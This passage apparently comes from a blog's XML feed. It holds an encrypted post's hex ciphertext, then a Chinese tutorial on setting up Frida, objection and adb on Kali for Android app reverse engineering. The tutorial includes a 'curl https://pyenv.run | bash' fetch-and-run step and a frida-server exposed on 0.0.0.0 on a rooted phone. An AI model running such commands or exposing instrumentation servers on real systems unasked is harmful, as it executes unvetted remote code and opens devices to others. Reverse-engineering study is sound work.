9d86b773150ed3b5e96df323c9b903ecccc21ecda85d3c7e080bc5c69bb072b5454439dd4938cfa14be2ad1b23eb393a43ee67b4b1f557b8a2099b9fb5bc717b11e4aa083cfef724b7d8c409f3d979b108cd8b0ce0d100fe92653f63694ae144fcff6334fb5e4d4e614c4dd686aecf3a02676a6c27562c374d5bbc40d5dc3285fe9d21403b86b0075180284db72aafaf402815a6fc5a37a519071c25e115a6b7e2d2b25ba2caa4028d78a5897dcdb16e3ea85899d780664b4b206b157fd14849cd9bc472297259157a1980cdc99bcdc941424ecd08fc5153eaeb3658be7f3b4fe33e13dfeedaa44c61737db6a48f7b822459de4c6cb1879b09a924448b0be176929d42775b5ea55df52d402e3630225986cbbd1c700f278e39cd194779e0247fbc8466af9c40decda0ba8e1c06a5edcfe26f15143cef9ab21c516bd4da158a6b16ce9d0bfe5a300b28a65c9d82bce854c5520c84de4e6cd9f8972cb7f88ade6401ceb193705ab96ab4e095a194099538a0078dcc1a5085a5cac9adde249dfd6b4c286b700e23548b5f3de8c3b1fb1618051afde0e50745bb661c31a6576a9187ed87d15c62f25cdd51fb58e9b730794ccabee454617225530a9d7c4bbcbbfdb55a02595841d8a01b3e83509aa366d72865672ea3888ce538160f073ec688297465e96901f577e72430c7b91d2c1b2508ef3a2f19c38d825aa10ba0245d9d19d7bac87defd498f82f5665e32c8bc60cd7d366ac231b8787db531e90678ccd5137f1e1c61b79a329da10c2452b76b6f93346eec9a47f4ee5129b10f62ce9c38e54d2b3027b26d56512bec4b76b1976f572345dffd663764aa20583750c1ff2a39303b59f87bde645927ac5cf7fefd59f0101b24e60b59af5d1cf9410a712a9b71af202af072f29ad6fbe796a0c9c4d4a4e0853bd0d304a97cc658897cc8cb8bcc9824769b6994bdf52fea4316d0549e7e9c31c68ff71614b5707c39f75c4e32c7e831bfc1ca1d6eb8c512e3af9ce3c886c04326d63dab32c1e50e323f3663302bb4fb1e773be57e644d177d2014a99f500e3b9c9e454a4376d33a1bf78135e83db88dcccb84f3b273a30e3536623156bcd19dc5d51e4e24062aae344c6bb0d731bd0a0186bcf77acc928dd3988481a635584e7519fdd711ae861b8e00822c2bbe32a8330ae50322573d3bb286aaf6ef56f62a6a4f3ace28131a4fd22bcda41003b957b870977431e2b817e4b4e414c85bd58a93b7095477e4b5dcf887d14e9ce3552f275ce530143128d8ec9df2efffd7dde95e7e8c92ac236079464700eeac29992a1962ba0e3ab46ad49a01ac23189816d1484f377676ff9bf1c4ae7fd826ccf3920e2d62b5e38b1b9653ac50b7fe23aa71a57a73c7d340626175f5268a8f5f749e349887f4f2902272db1518cf6c64301063e42e3c25a30d717da909a3b5d44a7b2cbddf5d6cadd49125bf5ff020b9c544bed10a0153bac81a66d1fe13eaf532eaacf70eba9c31c160ae5ad67ac494ba7b14851cf50dd229203d1481a2850f2b48d45ef71fbaa48dfe84849b689a8539092fffe1fb3a46f8eaca40a66718f96de20d9d41b4c6305e1536d3dd24cd53cabaaae13c59bbb8df558eb87e3e883589935961d2995345507f033b0155676c9c6b05e460abb35a18aa02eb3a169050027c219debafbb81341ee61e7bb13913e6c493832a9f2242fe82b1e292ea08654838f5959331788f1524c91384dc363cf0746ae1d4c242dbd07776f4de22dc11856352bb8d634e8543ac3b150eff3975161e75f95e55b1c947c8e1772c098ec04fa2bafc80139b93f756cf84a906c257e777b5d26265f2304680aa7b3bbf4f81253f26839b0a27a3fcf8d9510e88ebc343c2437fd011d7ca9566a23c91fde9cff08f356d2a210c1735ad4ceac0c2e562432eb52bbb9126279bd3f3883d4a9302372d9af84fdb4145721474e1c7b3ecdf4c3aa47bb4d898accbc0b6739eb628710922d7039d125e9728c834015193a4f6f0af07eecb4f31f8075c3349eed1be522f22d8886f4ffdf2d1d637ed0ba193ebc2a7edd434c716d1b0b0590cac43aad7d01736872a22ef3bba3d7c241015f4852ae80e56d057b0256467db1453d363b5f34aff2d4d3f3fa78f43aec9b9d4013fe95f97d9f74e330352ab6fbfdf582411f00ff80b715e7439f5ac616088a7c6ad45cd20e2506676381844f87425c69f86b2832e4b950185cc931d315fc48485816fccb2bb82c91a716d5784dbc779574d48e7668790bd654210f64f296601f86206a18a7b691794232500a25de258782f571bb9b56170d72a3aa3d87ea0152c0e330070f76d919be3c15930ed84182619955b93bb6ba2c09c9d2db517248387759de0010960409f6f52d72de970d568dea95342021a867a3129383e24ab7ccdac10e0fbb9bdea6ef7e44ca1612e2eca1cacbe7038f3d023077980b4ae2d1184455e851655891187fef568d62590d2ea02d077d83c24f18b61991916c4a5619b3b99850cb6ed2a0c312a9a546d9990672dd9f0e544c9cb81aab62a995fe0580fcbf4e6e22e5c4fb1e37edff25935b534804a9fdad68e7bd3a356d23c057f344ad4b7162c071cefad99471ce110e625c821b8221c81d30bb96a23599926a450e00eda83208dd4f763b4ee002497b55430de574ff6eb1ff2f2a384b747031813886859f063a70eb5384aa24fd1df4849c0d799c988860805515e38521f151376f604f6cd62f54d20748795b3e7d9e477ac68b1a9ce26aa0a98e55c52e43caf142575d740e134e2f919328b01533f713538c06ff990134d6bfb3e0059d0db0037ede007995204855775f3afa17963d23b62e150365843957d1a306f73da020109d5386b342155ae16614dcdec4782c4ff2357f30e2063095ea0610a0dbe72fb2b7fdf439ac4207732ee97b8c6a7762b0018b13964ad9e050c4f3e384506bbe643275b13129829e5ed9d17beed38c55a698f23f0269586737a1f26b5f6a5ba5536c0511ac42b259441ddefa1963efedf8423afec9c81aeb092bc59db91bed46d0c529aa748f8ffdfc0bacb0fa33e75f21f622876b90ac90b594e4e8f2fe8c525bd2bf50c7bf565b12a87c22bba49273ead6b148ab7c87b4689512145a37720497d6cd448e78da1b0e05f8c65c6b6b439dde5d766808fb7e7ac97f55d196f7963c5b458522133e8bcca5122f5cf7c3657150f098011ab2b147995800e9052e2e18fa6ffcf4f59af571196dd05dc21b22e1597e5e4618f5bc0c81535df6e70c781cb9d926e5d30155af2515d10817592fac0eeab954a8e6a5c86235f20b784aed9d6ab3e2f6637fa8d871394984160290074cb014838c446e5835ecef6143e6c57766e8234ab8257c50d24b484d567e18c70aba5b44b14c04192f1be76d97304bb0c6e75aa13ecf590a80dfdb9407c0a7c7f8e793f9685ad4f71ebbd4c7e59e563d8c3ffd31be35bddffc828addda63243fa7d24e3a41cd7e99f495110e8453b6bd918f53b77af6eb793f91ddd883429d26443e581dbe85256aa5552f7706d839c4bc8cae4faf581cb4dc4525ece91e4f15e4bf47069f0731a882138e31f77fb531ddb0ed5a9da819e37d6a8a45ee81d8d4e46caca33be016c09b66bb621854c9727d5c1c321ea6dd05147bc543fcd2f6d1e4c0f919063fe22a6e31d218f040d920e9337524afc751a56810640348b736e26bcdf698f56611bae816ad73bbcfaad2700c548afb2ccee135eedf5fd39967ead893645fed15989bb37bf768d2c2f0b12299482fb806c6a7e296a0c247af1b7457d4d4c09cf06f7eb79d2c698e46e156c110ea6bb7dc0a6828a02e8cd19366fe51a9b44d65e88c4aaf3cc7961f8ac84b15e4b8f9d3aaaca228d70853c5a79dfd4db84c13b257f15272c0c294649138c8bec3bd54015b4bb180a214efbb226e3db8bdeaf9c39ab940d2fd408711738a9fbc823f12fe08276151b17c4e5915d173aa4c2c98c32fbda4cb9487defa066ac76a15aa217c4f5887469e479cfe025cd4b3b059e0ad739c59c48c0015601542c2e601a8e9cbc536025dc47e87cdecff37cc851563a7690702927c1ac10e2afdd70e9059dae645c22793f231c37fc1463f70cba0ce02e478bf76549393bea274d9c95f1c718eccd85fcbcf74eab7d3f00eb03e8f172e5cb8c291c0fa5bd2f290ee6f2f974b3baad272397a56742a75b037dd75f96592b2748bbc62c15740bd8b6fdaeb7727069c888ad1b2f3b5431cdd47c51975643019383c47f6f2740d7622b20e608b967022c6bdc32472382839b36a7cefb8d9067850fe200cb2d3780432f20c23aa4b29c10532a475480b414926205b02a7191b3a07faf27ab30d76fc2f16fe0455b3ae59f56af38748928fa1ff123e05ad87c3f45c87685f3dcf217f1a2137a2893fe14b89a6de93e6edb034a78374587080bdd76e4bd2fbbb737f5981d4e43ab8e6ac9ae0f9fdb80de0e53c4bbb8bf7908462af605c450522a21b400f9c8a3beb00debbce05ee539e15cb166f4b9c26b17579391a33316ac0b41e310d416e476f636782ce36efc2c483e5416d3fe7aae228eb982153bde7f6c4c7a6b86f28b0e5af562f1b851343e573343f5890cc5462f5c041533781946dc637c0336913f7789e08f364f4169c9d06786b21b58e3c8fe6cca14fd318c9c56f6df6a999c8e5745226a384dd957b36bea7b36dd5df03fd6959f7253fbd741224d65abdb9d553db98483d45d2d26afd15cb0fab3eb17035a4113a5d3e174db69463cbeaebc3816edf1b34ec554b99eb4f3cb40cb60fa481ccddd55a9cbd7d3bef2f98efc506b134745e8a11d7f1e69c465376e1913412158f8178946c39d14074e196be11b2dafd2b83dff716b6afa68c4af7a1f4c53bfbc485cdca691f75bcc69daaad6719475410e6569278a13c4c8e53bed4905cda4f2414d8b99ae375d237e25374912a9f05f187ca9279f6c64fa669b3245faae21446b730b9fe22fbb5f5792f6f3eaa6519b7603bf67363e6857cd121cb97aea6365eda5f29be2245cb2698f18ff5d3479ab08462497401fd5a4f9a2dffca43a78c2b2222a80711f01ff73b93a165ab99717b583f3de27db91b49e7187b54a4430691cfb16e30759b8df80a81ed1a2eaf626e3ca5a3bb9dbe677eb94e94d3bbcf6a7911ffc8dcdcfdaecccdf675e5cc330f54f71e05d3d377b4c6732b85abb63fcef45fabe15fb6019df2b7fc40731a3ba22b9af5052e92d78ca887d198b194e03004a326b6da3b394bf6cac401add2a0d09fe014eb57b2d895c07ea3a4e1bb45eebf3646eef61174a9c7c9479e2cdccb795029b7456826518df3cde59c18482fe25091281f998a87c0c08484df1ef3b0733f32e27ed9f90118ca60f618232fd877ad9caa00f140dbb8a937f065b52a00dd5665ffb81360b1850bcc4d18091316cd0a2c1a3934bf807c1ae6f6035289eec73e3945c482de3371d3eec5294488cb9b8c01e63e29301d697022e5180a72c8ebe3eb14205b3a5e8052d9cd5073e08f166db40c2ef68fce37c20f83c37511c6ce0219bee1c70f2f0885568cb641beac6a7122614fdecc15c30f42d79ded939139c2c1372c2fc5ddbbe483cd77baaa2da88edd69b5c82b2060f7b10f7b313a88f97ddfbd13a2290a2b8e236f10a727cbad22c6f4c5d6af69d45acd85ae78b82970729e605e0b857ef83e493e4e646b2f92657887890d19e2a6929fc2c61d8d916617eb54cd559de5846df178dca23becf79b2d7e12137972a26f6626f1b074e9ed40972c9e11a2a09d263aa3970d5be27751b4eaa5c23218c479e111cccc5fcdd2ae84861eefb3b283d0afc6c21d2ef6a9a2271974e296c5b96374b4e690fb5fe28f63f2d379f2df34de2eee94ba334779293401a24d0f89f90e8b44fba2d41b19bae577b3a5b194108d8f49489c81b8e36cf5d0a001c7d2bd7cfd0c2e5d5cc3430f37156936e4ce955a4029eacf7c60cebad96be79db0795401ab8828cca19861f84b0a21d35c8bc9479b3b60b1052c5e0a70310f0be2f004f1092a8cec508374b972d6fb22bdabba39362af33c477cfb18c3bcb030be5b5cd87b3aa1d898688fe16b5a0c13b3655b7dae54353fea2d54244e527f1fe017badf92948b4830ea22746eb867c10d912bb7b24db0bd455ae4aba8758e649abcf519f0c9f78cc9118cf487ab4a42053180926f7b2cb67e4aac124360bffbee751953ebc18fc3f2e0cf13c0775a084ecfbef0c683478ad449e02bb81403b23c72ba5376c877502910223cbc878fabba45b4ac7a0cb599665f21a5d7632ecfc2704a1903a5a6138c2cb6345279e3cef4360cd4bc0184bc91a69cc1e2aa4aa2b728a33c1117c53d7aaf58dc7296a679a845bda3c6e33b448b51be7b53c4fee6583d1ef6b2e85240b9ace7d488354f966233d663465b9e75b3bb8094c3b42e3fc8361e5d37945dcc40fdd92063ac5aee29fd3282ca9e160016cf7767e48027556706ec0756a17a39fe6b0aead2a08734a73ad7a9a5e9e35deb95350165e5c8a2e894a682162ba42772d7ec81fe64b0fa41a50871b2a1713c37721ad622fac98e026414a178183d23af9d4e283e29dd6a1362962fd076f5f0a5a5da47c636f5b557016c74627dc702ad9bc112e1c24d2e928e5d879770768c52acb89afb0c15d5bd5c93aa5d0e519c63e9c2e3daa23fde0e77fe5b2d2dab7830782512ee564fe044bcca36b8db16fc81d1391032e2e18ddff39467afde458e943ce4ae360cbe573228350520047ed0bdf89b384de07121798b8f37c21f365f98ac3f51a1c49691ac0011a85d0b6e22a711d5227c3efb368aa8e04331db430c5200de22f1be1a43e2615c95a6f9ed609090bc66fdb176ad37b10a8285d2afb60142e5c072682ef845110867d5b83242223835645eeda55035f76ab6f5c13391fb1a4a1182c1f3df43b82f447046ce6ae1d6e6253916846da8204431f71143b0f089939522ac7efe1df8fa6a15181078b7e9d47fc25969d65b4a0c48e497622c171b7a151244bd052b643fb41c85954da0ea63adb64b81cb2adff1688faa8ada1fb79b161bcec86242455976e613b35c9c1ae5ed9ddc84509e4cbcefc1ead8485fc83c2e652842a805a36827e50e8d1dcddcdc730f7ad346b229a9b421d514c806d6e7a178825aa10273c20cbe5b3ac3ac1729a1838b3a91d8efacdce287a9b444bb65ed6469ac2fe2ac2b2682e299e231ff7c758b12cf40252352c2aaf289f5fcc701f656612be3ef43a646fe05f09868a7292cee431a68a7f360808ca32a1d7d032c4f35aa5f22a03faefe4e95df3f038eab05c737caacbe8e9196323879cd4defb9a72375e3cc763530c2058e518f247efd3428133718949419945ba35dca4c3a52da735fbaf8e6498c0beab946b2b51f222213d42e634552cdbc7ef49c9f93473728aaa7fd01f81c907c005524197a240d9dc5ccc035710ea30deab5f2f9668227e07bceeb4d0a7e209afc185ba95885ce01dffc255f0c0dc22fc28b9e4a69086ed24482c080a1912cd7dda85f5a5e72b2a7b6cff97c5fb69789b0501a3bc69ac95442eadbbbae90f2a23dd8a54cef14456648c5864cbfe32595ea1f07c6b374affdaa929c23bc052fe7a0ed48b9f6c5933c37ccd3ff02ff39c4f6cde6072e905a03f6eae1275e5c6dc7b085226e02c62d391c14ff59ac2c9ca7029f3cc20f602f90b29fb72da4afb46b54cb56922baca773461cec87b6bfc5906308f6ff00fec6b8da8dfab689ace077c2361b65594f57538a6a2c54a6db1fdf0cc5597f92714d71b70b73c1fcd5357908759aba1ba9c22a100022c7665530d87a9f2ee22c2f689b1feccbcd0ed4e67f63ead8b8c9995c2206c4967ddd24131155b773980e03c66cd50b13ab8e699cb3e31a2ed685598e903312691e57a874f4010821f62274f7b98b14f534c9615ec6b9701ad78b483d791602e445db1535fe1ec568c2df795db64f707ffeb57942babc77fdd7a8cc5f2e67c12b5ea092b5c3f523aa7597c8f86d3aea4c1b94c71a82cbd2826a7ffe49060abdc0b5fd289aca5c02d5552280be5484f4f45bf18a6bd9dc2f39eb527df08abc43cd2f777fb4196f014ecfd68648016f1caed174b26e560414dd3c90265f098ae6b80ffca55005d96efbe923b2c4263c248cecaf95d1fde873ca64f5602047462ebd600727c0b806c60d6f81d8836cd18fd748205c48e91047450d3394138541b541061aa792e285ec7c063d162977de45ad4aa3c2152761f2e725eae2ff51e75b56b50b737ecad76150b573cef666e84025fd0d5da9ba638c932970e70b63dde5a63716b4ddb1f33f9cc56ef3eb65c99a5e42fbed7e012185b776fc017db38d7f33cd43d296a52c1577a2da7123272efe27412b6189f17bdbac8ec6af3b881bb61ece866ce3600e692663d57dc2e117565bbb55ef861bc2d0ecd6b0b2a901c6318a4e86b1e3647724a674b34e7eb73861ea0653f69d68d76e72d0017f067c00c9e969b77ac640107e7d3293e3ee3da4e45b63b3a42d5d17c8f3c6d17152d146a59706b918e6e001b4423f0b8e6c058234609d1bd59ace97f83c495c6833b95301fb513eeaaf9437f79ece52517b50f0bf097b1f439639e00e3e65d2c56e140b0198c231ab736e3a13ccc07c173d2195c68e67dd12cc5448fb3650099b68ed99cca30c623fb01b30a06b72b6d54bf54cfbf2f4ee785ecb51b0703a10fb793a85659de1157d1650435de92c8019ed368b29ebc5143c83512ad49d815d3acfe0ff35bb17b83da7bc9d04d8b84895258334e74481ac2e86478a16b63c3223da28b90182851495229f596dc431a2f35023a8dc3001a14dda6fd01d5b45dc5a7674d0e56745b81466e572d6ed25dbe12472083bbdaca00616e88f7e914b43a439c57ac52f7d26cd245b8e8ad89e2a42ffa35763cf48dc5636dc3477aaf0f9b777b2c27125699beb78e224bb05f09cbf05cb5cdcd7efdfd4c3d84523a7585081a421dc62cf44c5f3fbb0621117c901645e5b40de810c93678622140a613d71b070f81ca23e27ff352034da22cf399e5a524278802336bed618290cf870ee0f7da1307726dcd787a9b0f85cfa14d6923bbc0eff7d1b1678cf6b40204e5e638979335b34be1eb72d01b2aabc523368cab43d1e139059f0010ff77d05ed8d6f146ac200f98a91e5063ddb14eab6d998ec54cef225dd8ec614a824c3ac6cbf48596b495477a3af1dfa806ee0565f8e3bf11e833909b75d05ee82d3c8799f308bfbd27846e94e525b6f3af7bb037df14976f5bef54d622cdbeafbb525fa1c76cf4494caeeeef35ca53afbaf4cc74baf3deb2c4830a8e06ce7a7016a610ed9bdaa529bb838cad31cde03f4665b14305a9917a8507bcd648c48a5173dfc7f14bd6502dc9b49fbd29bb15b56e36666357322bc943a150cdb1aae4a43cc23383d3028effde0469613c4ef6f5a49d33e7a07c6d89944fa45b3ae448c2dce918afb69dabd249b3fa3698a9f89cc19a83e58774bd43a4adf7c06448fc86e7d66f2ad6008905a51fb31f6102dc0beb5ffc88ba89d68c7767</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>协议分析</tag>
        <tag>App逆向</tag>
        <tag>frida</tag>
      </tags>
  </entry>
  <entry>
    <title>Frida开发和调试环境搭建</title>
    <url>/2023/11/04/%E7%9C%8B%E9%9B%AA2W%E8%AF%BE-Frida%E5%BC%80%E5%8F%91%E5%92%8C%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<p>本章记录在kali上配置Frida开发和调试环境，这个环境配置真的相当麻烦，不同版本很容易碰到不兼容的问题需要多注意一下。</p>
<p>下面的安装流程仅限于<code>kali 2023.3</code>版本</p>
<span id="more"></span>

<h2 id="安装kali虚拟机"><a href="#安装kali虚拟机" class="headerlink" title="安装kali虚拟机"></a>安装kali虚拟机</h2><p>直接下载<a href="https://cdimage.kali.org/kali-2023.3/kali-linux-2023.3-vmware-amd64.7z">Get Kali | Kali Linux</a> 的VMware压缩包省去安装流程</p>
<p>默认账号密码都是<code>kali</code></p>
<blockquote>
<p>打开之后先设置一下root密码、修改一下默认字体大小（kali默认的字体都太小了<a href="https://blog.csdn.net/zibery/article/details/126975523">修改一下</a>）, 安装的时候使用kali账户安装不要使用root账户</p>
<p>检查一下时间如果不对的话也修改一下<code>sudo dpkg-reconfigure tzdata</code></p>
</blockquote>
<h2 id="安装配置clash"><a href="#安装配置clash" class="headerlink" title="安装配置clash"></a>安装配置clash</h2><p>这里选择安装<a href="https://github.com/Fndroid/clash_for_windows_pkg/releases">桌面版</a></p>
<p><mark>前两天clash删库了，回头可能还得换v2ray</mark></p>
<p>下载解压到<code>/opt/clash/</code>目录下运行</p>
<p><code>./cfw</code></p>
<img src="/2023/11/04/%E7%9C%8B%E9%9B%AA2W%E8%AF%BE-Frida%E5%BC%80%E5%8F%91%E5%92%8C%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20231027132822340.png" class="" title="image-20231027132822340">

<ul>
<li>有时候网络环境不好订阅地址下载失败的话，可以直接把主机的配置文件拷贝一份导入进去也行</li>
</ul>
<h6 id="浏览器科学上网配置：修改浏览器代理为手动"><a href="#浏览器科学上网配置：修改浏览器代理为手动" class="headerlink" title="浏览器科学上网配置：修改浏览器代理为手动"></a>浏览器科学上网配置：修改浏览器代理为手动</h6><img src="/2023/11/04/%E7%9C%8B%E9%9B%AA2W%E8%AF%BE-Frida%E5%BC%80%E5%8F%91%E5%92%8C%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20231030182519018.png" class="" title="image-20231030182519018">

<img src="/2023/11/04/%E7%9C%8B%E9%9B%AA2W%E8%AF%BE-Frida%E5%BC%80%E5%8F%91%E5%92%8C%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20231030182536370.png" class="" title="image-20231030182536370">

<h6 id="终端科学上网配置：这是临时的关闭终端就没有了"><a href="#终端科学上网配置：这是临时的关闭终端就没有了" class="headerlink" title="终端科学上网配置：这是临时的关闭终端就没有了"></a>终端科学上网配置：这是临时的关闭终端就没有了</h6><blockquote>
<p>export http_proxy=<a href="http://127.0.0.1:7890/">http://127.0.0.1:7890</a></p>
<p>export https_proxy=<a href="http://127.0.0.1:7890/">http://127.0.0.1:7890</a></p>
</blockquote>
<p><strong>clash配置好了，开始配置Frida开发调试环境</strong></p>
<h2 id="配置调试环境"><a href="#配置调试环境" class="headerlink" title="配置调试环境"></a>配置调试环境</h2><h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><p>依次执行下列命令，一个一个执行。</p>
<blockquote>
<p>更新apt</p>
<pre><code class="bash">sudo apt update

sudo apt upgrade	# 这个可以不用安装太慢了,不影响使用
</code></pre>
<p>2023自带的有中文字符集可以不用安装, 其它版本可能还需要安装中文字符集</p>
<blockquote>
<p>安装中文字体<br><code>sudo apt install xfonts-intl-chinese</code><br>安装微软雅黑<br><code>sudo apt install ttf-wqy-microhei</code></p>
</blockquote>
<p>安装htop性能监测工具<br><code>sudo apt install htop</code><br>安装网络检测工具<br><code>sudo apt install jnettop</code></p>
</blockquote>
<p>设置代理</p>
<p><code>sudo nano /etc/proxychains4.conf</code></p>
<p>需要注释掉这几行</p>
<blockquote>
<p>#socks4        127.0.0.1 9050</p>
<p>#proxy_dns</p>
<p>#strict_chain</p>
</blockquote>
<p>需要去掉这行注释</p>
<blockquote>
<p>dynamic_chain</p>
</blockquote>
<p>增加一行</p>
<blockquote>
<p>socks5 {IP} 1080 #这里是给jnettop使用</p>
<p>如果需要VPN代理，可以再下面依次写入，会自动切换不能使用的代理。clash这种订阅链接的话不用设置</p>
</blockquote>
<h3 id="安装pyenv"><a href="#安装pyenv" class="headerlink" title="安装pyenv"></a>安装pyenv</h3><p>安装依赖</p>
<pre><code>sudo apt install -y make build-essential libssl-dev zlib1g-dev libbz2-dev \
libreadline-dev libsqlite3-dev wget curl llvm libncurses-dev \
xz-utils tk-dev libffi-dev liblzma-dev python3-openssl git
</code></pre>
<p>安装pyenv</p>
<p><code>curl https://pyenv.run | bash</code></p>
<p>执行完之后还需要手动配置一下环境变量</p>
<blockquote>
<p>将 <code>pyenv</code> 添加到你的 shell 配置文件中（例如 <code>~/.bashrc</code> 或 <code>~/.zshrc</code>）：</p>
<pre><code>export PATH="$HOME/.pyenv/bin:$PATH"
eval "$(pyenv init --path)"
eval "$(pyenv init -)"
eval "$(pyenv virtualenv-init -)"
</code></pre>
<p>重新加载shell配置</p>
<p><code>source ~/.bashrc  # 或 source ~/.zshrc</code></p>
<p>检查一下是否安装成功</p>
<pre><code>pyenv versions
which pyenv
</code></pre>
<h6 id="pyenv的常用命令"><a href="#pyenv的常用命令" class="headerlink" title="pyenv的常用命令"></a>pyenv的常用命令</h6><p>pyenv version # 查看当前系统使用的python版本</p>
<p>pyenv versions # 查看当前系统拥有的python版本（system代表当前系统的python版本号）！！！</p>
<p>pyenv install –list # 查看可以安装的版本 ！！！</p>
<p>pyenv install 3.8.0 # 安装版本3.8.0 ，可以使用-v看详细输出 ！！！</p>
<p>pyenv uninstall 3.8.0 # 卸载 </p>
<p>pyenv local 3.8.0 # local仅对当前目录及其子目录生效，告诉目录使用版本3.8.0 ！！！</p>
<p>pyenv global 3.8.0 # 告诉全局环境使用3.8.0 ，为了不破坏系统默认环境， 不建议使用global命令</p>
<p>pyenv rehash # 重建环境变量，每当你增删python版本或增删带可执行性的包（如pip）以后，都应该执行一次本命令</p>
<p>pyenv which # 显示pyenv在运行给定命令时将调用的可执行文件的绝对路径</p>
<p>PS：使用<code>pyenv install XXX</code>命令安装python的时候可能会显示缺少一些库文件，需要先安装了之后再安装python</p>
<p>安装frida自动提示补全</p>
<pre><code>git clone https://github.com/oleavr/frida-agent-example.git
cd frida-agent-example/
npm install
</code></pre>
<p>安装frida、objection、frida-dexdump</p>
<pre><code class="bash">pip install frida==12.8.0
pip install frida-tools==5.3.0
pip install objection==1.8.4
pip install frida-dexdump
</code></pre>
</blockquote>
<h3 id="安装adb"><a href="#安装adb" class="headerlink" title="安装adb"></a>安装adb</h3><p><code>sudo apt install google-android-platform-tools-installer</code></p>
<h3 id="安装VSCODE"><a href="#安装VSCODE" class="headerlink" title="安装VSCODE"></a>安装VSCODE</h3><blockquote>
<p><strong>导入 Microsoft GPG 密钥：</strong> 运行以下命令导入 Microsoft 的 GPG 密钥：</p>
<pre><code>wget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor &gt; microsoft.gpg
sudo mv microsoft.gpg /etc/apt/trusted.gpg.d/microsoft.gpg
</code></pre>
<p><strong>添加 VSCode 存储库：</strong> 运行以下命令添加 VSCode 存储库：</p>
<pre><code>sudo sh -c 'echo "deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main" &gt; /etc/apt/sources.list.d/vscode.list'
</code></pre>
<p><strong>安装 VSCode：</strong> 更新包列表并安装 VSCode：</p>
<pre><code>sudo apt update
sudo apt install code
</code></pre>
<p><strong>运行 VSCode：</strong> 安装完成后，你可以通过命令行运行 <code>code</code> 或者在应用程序菜单中找到 Visual Studio Code 并启动它。</p>
</blockquote>
<h3 id="安装frida-server端到手机"><a href="#安装frida-server端到手机" class="headerlink" title="安装frida-server端到手机"></a>安装frida-server端到手机</h3><p><strong>安装frida-server最好跟主机上安装的frida版本一致比较好</strong></p>
<p>在官网下载安装包，<a href="https://github.com/frida/frida/releases">官网地址</a>。真机下载<code>frida-server-12.8.0-android-arm64.xz</code>版的，手机需要有root权限，刷机教程可以参考<a href="https://xiaoeeyu.github.io/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">Android刷机+抓包环境配置</a></p>
<p>将下载的安装包解压，把解压后的文件push到手机<code>/data/local/tmp/</code>目录下</p>
<h3 id="测试是否连接成功"><a href="#测试是否连接成功" class="headerlink" title="测试是否连接成功"></a>测试是否连接成功</h3><blockquote>
<h5 id="可以安装一个WIFI-ADB方便多个终端链接"><a href="#可以安装一个WIFI-ADB方便多个终端链接" class="headerlink" title="可以安装一个WIFI ADB方便多个终端链接"></a>可以安装一个<code>WIFI ADB</code>方便多个终端链接</h5><img src="/2023/11/04/%E7%9C%8B%E9%9B%AA2W%E8%AF%BE-Frida%E5%BC%80%E5%8F%91%E5%92%8C%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20231110192651349.png" class="" title="image-20231110192651349">

<img src="/2023/11/04/%E7%9C%8B%E9%9B%AA2W%E8%AF%BE-Frida%E5%BC%80%E5%8F%91%E5%92%8C%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20231110192743475.png" class="" title="image-20231110192743475">

<p>启动手机端frida-server</p>
<pre><code>┌──(kali㉿kali)-[~]
└─$ adb shell
marlin:/ $ su
marlin:/ # cd /data/local/tmp/                                                                                                        
marlin:/data/local/tmp # ./fs-12 -l 0.0.0.0:8888 &amp;                                                                                    
[1] 28392
marlin:/data/local/tmp # 
</code></pre>
<h6 id="测试：通过WIFI-ADB连接frida"><a href="#测试：通过WIFI-ADB连接frida" class="headerlink" title="测试：通过WIFI ADB连接frida"></a>测试：通过<code>WIFI ADB</code>连接frida</h6><p><code>frida-ps -H 192.168.1.8:8888</code></p>
<img src="/2023/11/04/%E7%9C%8B%E9%9B%AA2W%E8%AF%BE-Frida%E5%BC%80%E5%8F%91%E5%92%8C%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20231108221610087.png" class="" title="image-20231108221610087">

<h6 id="测试：js脚本注入"><a href="#测试：js脚本注入" class="headerlink" title="测试：js脚本注入"></a>测试：js脚本注入</h6><pre><code class="js">function main(){
    Java.perform(function(){
        console.log("Inside Frida Java Perform !");
    });
}
setImmediate(main);
</code></pre>
<p><code>frida -H 192.168.1.8:8888 -f com.android.settings -l /path/0530.js</code></p>
<pre><code class="bash">┌──(kali㉿kali)-[~/Documents]
└─$ frida -H 192.168.1.8:8888 -f com.android.settings -l 0530.js
     ____
    / _  |   Frida 12.8.0 - A world-class dynamic instrumentation toolkit
   | (_| |
    &gt; _  |   Commands:
   /_/ |_|       help      -&gt; Displays the help system
   . . . .       object?   -&gt; Display information about 'object'
   . . . .       exit/quit -&gt; Exit
   . . . .
   . . . .   More info at https://www.frida.re/docs/home/
Spawning `com.android.settings`...                                      
Inside Frida Java Perform !
Spawned `com.android.settings`. Use %resume to let the main thread start executing!
[Remote::com.android.settings]-&gt;  
</code></pre>
<h6 id="测试：objection注入"><a href="#测试：objection注入" class="headerlink" title="测试：objection注入"></a>测试：objection注入</h6><pre><code class="bash">┌──(kali㉿kali)-[~/Documents]
